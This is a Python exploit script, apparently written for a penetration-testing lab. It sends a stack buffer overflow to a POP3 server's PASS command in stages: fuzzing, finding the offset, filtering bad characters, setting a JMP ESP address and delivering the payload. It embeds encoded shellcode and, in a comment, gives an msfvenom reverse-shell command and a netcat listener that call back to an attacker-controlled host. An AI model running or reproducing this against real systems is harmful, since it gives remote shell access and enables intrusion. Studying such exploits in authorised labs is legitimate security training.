#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import sys
import re

#this is a base fuzzing script for the Password input on a POP3 connection
#Step 0: Set the IP Address and Port, you may also need to tune the socket interaction below
#    the template is based on POP3.
#    Main function should be set to findBUfferOverFlow
IP_ADDRESS = '10.11.6.155'
PORT = 110
#Step 1: Tune the buffer creation to trigger a crash by running the script
#    Main function should be set to findBUfferOverFlow
BUFFER_START_LENGTH = 2500
MAX_ITERATION =2 
BUFFER_INCREMENT =200 
#Step 2: After you're close, reset the BUFFER_START_LENGTH above and enable the unique string to find the fail point
#    Main function should be set to findBUfferOverFlow

#Step 3: Confirm you can control the EIP
#    Main function should point to find control, set the FIRST_OFFSET
FIRST_OFFSET = 2606
BUFFER_TOTAL_LENGTH = FIRST_OFFSET + 400 


#Step 4: Identify any bad charachters
#    Main function should point to find_bad_chars

#Step 5: Find a JMP ESP and set the jump address
#    use mona.py... 
#       1.  in Immunity Debugger type "!mona modules" in the text input at the bottom of the screen
#       2.  Find a DLL with rebase=false, safeSEH=false ASLR=false, NXCompat=false AND the Base memory location doesn't have bad chars
#       3.  Click on the e in the lemtwhc menu
#       4.  Select the DLL chose above
#       5.  Right Click in the main window > Search For > Find Command > type "jmp esp at the prompt
#       6.  if that doesn't work, search for a sequence > type push esp <ENTER> retn
#       7.  if that doesn't work, click on the "m" in lemtwch menu to review what is marked executable (immunity only searches executable)
#       8.  If the module doesn't have DEP, you can search by hex code through entire module
#           use nasm_shell (interactive) to identify jmp esp, (result is FFE4)
#           click on the c in the lemtwch menu
#           use the textbox at the bottom of immunity to search "!mona find -s "\xFF\xE4" -m [DLL NAME]
#               make sure the memory address doesn't have bad charachters
#               click on the ->| (black) button and search for the address and confirm it is a JMP ESP
#               copy that address to clipboard once confirmed it is a JMP ESP
#       9.  Restart Service and attach debugger.
#      10.  Update the Jump Address Below, but don't forget to reverse it as little endian for x86
#      11.  Find the address with JMP ESP in immunity using ->|(black) again and press F2 to put a break point on it.

jump_address = "\x91\xB3\xD1\x76"

#Step 6: Send Payload
#       Generate Shell code e.g. msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" 
#       Start a listener e.g. nc -nlvp 443
#       Pad the Payload with NOPS
NOP = "\x90"
NOP_COUNT = 9


PAYLOAD=(
"\xbb\x8e\xfe\xcb\x11\xda\xc3\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x5d\x12\x03\x5d\x12\x83\x63\x02\x29\xe4\x87\x13\x2c"
"\x07\x77\xe4\x51\x81\x92\xd5\x51\xf5\xd7\x46\x62\x7d\xb5\x6a"
"\x09\xd3\x2d\xf8\x7f\xfc\x42\x49\x35\xda\x6d\x4a\x66\x1e\xec"
"\xc8\x75\x73\xce\xf1\xb5\x86\x0f\x35\xab\x6b\x5d\xee\xa7\xde"
"\x71\x9b\xf2\xe2\xfa\xd7\x13\x63\x1f\xaf\x12\x42\x8e\xbb\x4c"
"\x44\x31\x6f\xe5\xcd\x29\x6c\xc0\x84\xc2\x46\xbe\x16\x02\x97"
"\x3f\xb4\x6b\x17\xb2\xc4\xac\x90\x2d\xb3\xc4\xe2\xd0\xc4\x13"
"\x98\x0e\x40\x87\x3a\xc4\xf2\x63\xba\x09\x64\xe0\xb0\xe6\xe2"
"\xae\xd4\xf9\x27\xc5\xe1\x72\xc6\x09\x60\xc0\xed\x8d\x28\x92"
"\x8c\x94\x94\x75\xb0\xc6\x76\x29\x14\x8d\x9b\x3e\x25\xcc\xf3"
"\xf3\x04\xee\x03\x9c\x1f\x9d\x31\x03\xb4\x09\x7a\xcc\x12\xce"
"\x7d\xe7\xe3\x40\x80\x08\x14\x49\x47\x5c\x44\xe1\x6e\xdd\x0f"
"\xf1\x8f\x08\x9f\xa1\x3f\xe3\x60\x11\x80\x53\x09\x7b\x0f\x8b"
"\x29\x84\xc5\xa4\xc0\x7f\x8e\xc0\x1f\x7f\xd3\xbd\x1d\x7f\xea"
"\x86\xab\x99\x86\xe8\xfd\x32\x3f\x90\xa7\xc8\xde\x5d\x72\xb5"
"\xe1\xd6\x71\x4a\xaf\x1e\xff\x58\x58\xef\x4a\x02\xcf\xf0\x60"
"\x2a\x93\x63\xef\xaa\xda\x9f\xb8\xfd\x8b\x6e\xb1\x6b\x26\xc8"
"\x6b\x89\xbb\x8c\x54\x09\x60\x6d\x5a\x90\xe5\xc9\x78\x82\x33"
"\xd1\xc4\xf6\xeb\x84\x92\xa0\x4d\x7f\x55\x1a\x04\x2c\x3f\xca"
"\xd1\x1e\x80\x8c\xdd\x4a\x76\x70\x6f\x23\xcf\x8f\x40\xa3\xc7"
"\xe8\xbc\x53\x27\x23\x05\x73\xca\xe1\x70\x1c\x53\x60\x39\x41"
"\x64\x5f\x7e\x7c\xe7\x55\xff\x7b\xf7\x1c\xfa\xc0\xbf\xcd\x76"
"\x58\x2a\xf1\x25\x59\x7f"
)




# unique pattern generated with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 500 
#then truncate it to the buffer increment

#Steps 1,2(enable_unique)
def find_buffer_overflow(enable_unique):    
    for iteration_count in range (0, MAX_ITERATION):
        BUFFER_TOTAL_LENGTH = BUFFER_START_LENGTH +iteration_count*BUFFER_INCREMENT
        print "Fuzzing PASS %s with %s bytes" % (iteration_count, BUFFER_TOTAL_LENGTH)
        if enable_unique:
             buffer_string = "A"*(BUFFER_TOTAL_LENGTH - BUFFER_INCREMENT) + get_unique_pattern(BUFFER_INCREMENT)
        else:
             buffer_string = "A"*(BUFFER_TOTAL_LENGTH)
        interactWithService(IP_ADDRESS, PORT, buffer_string)
        print "Fuzzing Pass %s completed.-----------------------" % iteration_count
#Steps 3
def find_control():
    jump_address = "BBBB"
    backfillchar ="C"
    #Note, FIRST_OFFSET is set at the top of this script once discovered with find_buffer_overflow
    buffer_string = "A"*FIRST_OFFSET + jump_address + backfillchar*(BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(jump_address) )
    interactWithService(IP_ADDRESS, PORT, buffer_string)
    print "FindControl Buffer Sent----------------------------"

#Steps 4
def find_bad_chars():
    badchars = get_all_chars()  
    badchars = re.sub(r'\x00', "", badchars)
    badchars = re.sub(r'\x0a', "", badchars)
    badchars = re.sub(r'\x0d', "", badchars)
  
    #repeat for other bad characters.
    buffer_string= "A"*FIRST_OFFSET + "B"*4 + badchars
    interactWithService(IP_ADDRESS, PORT, buffer_string)
    print "FindBadChars completed.------------------------------"
 

#Step 5
def take_control():
    backfillchar ="C"
    buffer_string = "A"*FIRST_OFFSET + jump_address + backfillchar*(BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(jump_address) )
    interactWithService(IP_ADDRESS, PORT, buffer_string)
    print "take_control completed.------------------------------"

#Step 6
def send_payload():
    backfill_char ="C"
    backfill_count = (BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(jump_address) - NOP_COUNT -len(PAYLOAD))
    if backfill_count <1:
        print "need more buffer"
    buffer_string = "A"*FIRST_OFFSET + jump_address + NOP*NOP_COUNT + PAYLOAD +backfill_char*backfill_count
    interactWithService(IP_ADDRESS, PORT, buffer_string)
    print "payload sent.------------------------"

def interactWithService(IP_ADDRESS, PORT, buffer_string):
    try:  
      s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      connect=s1.connect((IP_ADDRESS,PORT))
      s1.recv(1024)
      s1.send('USER test\r\n')
      s1.recv(1024)
      #print "%s %s" % (len(buffer_string),buffer_string)
      s1.send('PASS ' + buffer_string + '\r\n')
      s1.send('QUIT\r\n')
      s1.close()
    except:
      print "POP3 Connection Failure"



def get_unique_pattern (patternLength):
  unique_pattern = "Aa0Aa1Aa2A"#0
  unique_pattern +="a3Aa4Aa5Aa"#1
  unique_pattern +="6Aa7Aa8Aa9"#2
  unique_pattern +="Ab0Ab1Ab2A"#3
  unique_pattern +="b3Ab4Ab5Ab"#4
  unique_pattern +="6Ab7Ab8Ab9"#5
  unique_pattern +="Ac0Ac1Ac2A"#6
  unique_pattern +="c3Ac4Ac5Ac"#7
  unique_pattern +="6Ac7Ac8Ac9"#8
  unique_pattern +="Ad0Ad1Ad2A"#9
  unique_pattern +="d3Ad4Ad5Ad"#10
  unique_pattern +="6Ad7Ad8Ad9"#11
  unique_pattern +="Ae0Ae1Ae2A"#12
  unique_pattern +="e3Ae4Ae5Ae"#13
  unique_pattern +="6Ae7Ae8Ae9"#14
  unique_pattern +="Af0Af1Af2A"#15
  unique_pattern +="f3Af4Af5Af"#16
  unique_pattern +="6Af7Af8Af9"#17
  unique_pattern +="Ag0Ag1Ag2A"#18
  unique_pattern +="g3Ag4Ag5Ag"#19
  unique_pattern +="6Ag7Ag8Ag9"#20
  unique_pattern +="Ah0Ah1Ah2A"#21
  unique_pattern +="h3Ah4Ah5Ah"#22
  unique_pattern +="6Ah7Ah8Ah9"#23
  unique_pattern +="Ai0Ai1Ai2A"#24
  unique_pattern +="i3Ai4Ai5Ai"#25
  unique_pattern +="6Ai7Ai8Ai9"#26
  unique_pattern +="Aj0Aj1Aj2A"#27
  unique_pattern +="j3Aj4Aj5Aj"#28
  unique_pattern +="6Aj7Aj8Aj9"#29
  unique_pattern +="Ak0Ak1Ak2A"#30
  unique_pattern +="k3Ak4Ak5Ak"#31
  unique_pattern +="6Ak7Ak8Ak9"#32
  unique_pattern +="Al0Al1Al2A"#33
  unique_pattern +="l3Al4Al5Al"#34
  unique_pattern +="6Al7Al8Al9"#35
  unique_pattern +="Am0Am1Am2A"#36
  unique_pattern +="m3Am4Am5Am"#37
  unique_pattern +="6Am7Am8Am9"#38
  unique_pattern +="An0An1An2A"#39
  unique_pattern +="n3An4An5An"#40
  unique_pattern +="6An7An8An9"#41
  unique_pattern +="Ao0Ao1Ao2A"#42
  unique_pattern +="o3Ao4Ao5Ao"#42
  unique_pattern +="6Ao7Ao8Ao9"#44
  unique_pattern +="Ap0Ap1Ap2A"#45
  unique_pattern +="p3Ap4Ap5Ap"#46
  unique_pattern +="6Ap7Ap8Ap9"#47
  unique_pattern +="Aq0Aq1Aq2A"#48
  unique_pattern +="q3Aq4Aq5Aq"#49
  unique_pattern = unique_pattern[:patternLength]
  return unique_pattern


def get_all_chars():
  allchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00" 
  "AAAA")
  return allchars


if __name__ == "__main__":
    #find_buffer_overflow()
    #find_control()
    #find_bad_chars()
    prompt = "Choose your poison:"
    prompt += "\n\t 1. Find Buffer Overflow Existence"
    prompt += "\n\t 2. Find Buffer Overflow Location (unique string)"
    prompt += "\n\t 3. Find Control"
    prompt += "\n\t 4. Find BadChars"
    prompt += "\n\t 5. Take Control"
    prompt += "\n\t 6. Send Payload (don't forget the listener)"
    prompt += "\n\t 9. Abandon Hope"
    prompt += "\n\n\t Choice: "
    user_choice = input(prompt)
    print "\n\n"
    if user_choice == 1:
        find_buffer_overflow(enable_unique=0)
    elif user_choice == 2:    
        find_buffer_overflow(enable_unique=1)
    elif user_choice == 3:
        find_control()
    elif user_choice == 4:
        find_bad_chars()
    elif user_choice == 5:
        take_control()
    elif user_choice == 6:
        send_payload()

